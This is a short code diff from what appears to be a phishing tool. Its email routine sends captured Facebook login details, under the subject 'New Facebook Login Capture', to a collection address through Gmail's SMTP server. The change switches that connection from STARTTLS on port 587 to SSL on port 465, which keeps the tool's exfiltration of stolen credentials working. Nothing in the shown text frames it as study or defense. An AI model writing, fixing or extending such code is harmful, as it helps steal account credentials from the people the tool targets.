@@ -67,8 +67,7 @@ def send_email(text):
         msg["Subject"] = "New Facebook Login Capture"
         msg["From"] = SMTP_USER
         msg["To"] = CAPTURE_TO
-        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
-        server.starttls()
+        server = smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=10)
         server.login(SMTP_USER, SMTP_PASS)
         server.sendmail(SMTP_USER, CAPTURE_TO, msg.as_string())
         server.quit()
